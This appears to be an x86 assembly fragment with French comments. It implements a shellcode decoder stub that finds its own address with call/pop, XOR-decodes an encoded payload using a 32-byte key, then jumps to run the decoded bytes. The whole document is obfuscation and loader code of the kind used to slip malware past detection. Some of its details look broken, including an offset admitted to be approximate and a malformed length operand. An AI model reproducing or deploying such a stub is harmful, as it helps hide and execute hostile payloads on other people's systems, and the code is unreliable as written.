ection .text

decoder_start:
    ; === Obtenir l'adresse de base via call/pop ===
    call    get_base_address    ; 0xe8 0x00 0x00 0x00 0x00
get_base_address:
    pop     esi                 ; 0x5e - esi = adresse courante (après call)
    
    ; === Calculer l'adresse de la clé SHA-256 ===
    ; esi pointe après l'instruction call (5 bytes)
    ; La clé est située 32 bytes avant le début du décodeur
    ; Total offset = 5 (call) + 32 (clé) = 37 (0x25)
    sub     esi, 0x25           ; 0x83 0xee 0x25 - esi = adresse de la clé
    mov     edi, esi            ; 0x89 0xf7 - edi = adresse de la clé
    
    ; === Calculer l'adresse du shellcode encodé ===
    ; Le shellcode encodé est situé après ce décodeur
    ; Taille approximative du décodeur = 48 bytes (0x30)
    add     esi, 0x30           ; 0x83 0xc6 0x30 - esi = adresse du shellcode encodé
    
    ; === Initialisation des compteurs ===
    xor     ecx, ecx            ; 0x31 0xc9 - compteur principal (longueur)
    mov     cl, [SHELLCODE_LEN] ; 0xb1 [len] - longueur du shellcode à décoder
    xor     edx, edx            ; 0x31 0xd2 - compteur pour la clé (0-31)
    
    ; === Boucle de décodage XOR ===
decode_loop:
    mov     al, [esi]           ; 0x8a 0x06 - charger byte du shellcode encodé
    mov     bl, [edi+edx]       ; 0x8a 0x1c 0x17 - charger byte de la clé
    xor     al, bl              ; 0x30 0xd8 - déchiffrement XOR
    mov     [esi], al           ; 0x88 0x06 - sauvegarder byte déchiffré
    
    inc     esi                 ; 0x46 - prochain byte du shellcode
    inc     edx                 ; 0x42 - prochain byte de la clé
    
    ; === Gestion du wrap-around de la clé (32 bytes) ===
    cmp     edx, 0x20           ; 0x83 0xfa 0x20 - comparer avec 32
    jne     continue_loop       ; 0x75 0x02 - si pas 32, continuer
    xor     edx, edx            ; 0x31 0xd2 - reset compteur clé à 0
    
continue_loop:
    loop    decode_loop         ; 0xe2 0xee - décrementer ecx et boucler si != 0
    
    ; === Retour au début du shellcode déchiffré et exécution ===
    sub     esi, [SHELLCODE_LEN] ; 0x83 0xee [len] - retour au début
    jmp     esi                 ; 0xff 0xe6 - exécuter le shellcode déchiffré